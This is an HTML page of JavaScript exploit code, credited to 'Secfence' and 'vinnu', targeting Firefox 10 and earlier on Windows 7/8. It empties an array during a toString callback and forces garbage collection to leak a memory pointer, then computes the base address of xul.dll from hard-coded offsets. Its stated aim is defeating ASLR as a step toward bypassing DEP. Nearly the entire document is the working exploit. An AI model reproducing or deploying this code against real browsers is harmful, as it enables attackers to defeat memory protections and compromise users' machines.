<!--
	Team : Secfence
	Author : "vinnu"
	Target : Firefox < 11 on windows7 / windows 8
	Aim : ASLR bypass - > DEP bypass.
-->
<html>
<head><title>Firefox memory Leak Array <=Firefox 10.0</title></head>
<body>
<script>

var pointr = null;
var dllbase=null;
var timer = null;
function gc()	{
	for (var iter = 0; iter < 1024; iter++) {
        var block = new Float32Array(1024*1024*4);
        delete block;block = null;
		console.log(iter);
    }
}
function leak()	{
	var leak,LEpoitr;
	var b = new Object
	b.toString = function() {
		a.length = 0;
		gc();
	}
	a = ["AAAABBBB",b, {toString:function(){}},unescape(new String("%u0c0c%u0c0c"))];
	document.getElementById("le").innerHTML+="<BR>"+escape(a.join(''));grab();
}
function grab()	{
	var ihtm = unescape(document.getElementById("le").innerHTML);
	pointr = ihtm.substr(ihtm.length-2,2);
	document.body.innerHTML+="<br>Pointer : "+escape(pointr);
	dllbase=basecalc(escape(pointr));
	if(dllbase!=null)	{
		document.body.innerHTML+="<br>DLL base (xul.dll) : 0x"+dllbase.toString(16);
		killtimer(timer);
	}
}
timer = setInterval(leak,2000);
function killtimer(tim)	{
	window.clearInterval(tim);
}
function basecalc(spointr)	{
	var iter=0;var base=null;
	var ptrtails = ["%u6AB4","%u8428","%u40D4","%u6273","%u4444","%u8134","%uDB9C","%u4588"];
	var diff = [0x00C96AB4,0x00C18428,0x00C040D4,0x033A6273,0x00C94444,0x00C18134,0x00D0DB9C,0x00C14588];
	var pontr = spointr.replace(/(%u[a-f,A-F,0-9]+)(%u[a-f,A-F,0-9]+)/g,"$2$1").replace(/%u/g,"");
	var hpoitr="0x"+pontr;
	
	for(iter=0;iter<ptrtails.length;iter++)	{
		if(spointr.indexOf(ptrtails[iter])==0)	{
			base=hpoitr-diff[iter];
			break;
		}
	}
return base;
}

</script>
<!--<input type=button onclick="leak()" value="Leak-Array2"/>-->
<input type=button onclick="killtimer()" value="StopLeaking"/>
<div id="le"></div>
</body>
</html>